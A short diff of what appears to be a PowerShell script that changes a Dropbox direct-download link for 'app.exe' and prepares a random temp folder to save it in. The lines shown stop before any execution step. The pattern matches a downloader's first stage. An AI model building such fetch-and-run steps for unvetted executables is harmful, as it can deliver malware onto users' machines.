@@ -1,4 +1,4 @@
-$url = "https://www.dropbox.com/scl/fi/bmhzfsr1jozvewn6nf58f/app.exe?rlkey=nczxbpok66yan9ikshrupo0pm&st=2niocezv&dl=1"  
+$url = "https://www.dropbox.com/scl/fi/ffhayfxoponlb0j7r0590/app.exe?rlkey=647ndk2z1vad36x2z5cuf27bc&st=hwj1rifa&dl=0"  
 $tempdir = "$env:TEMP\$(New-Guid)" 
 mkdir $tempdir | Out-Null
 $file = "$tempdir\app.exe" 
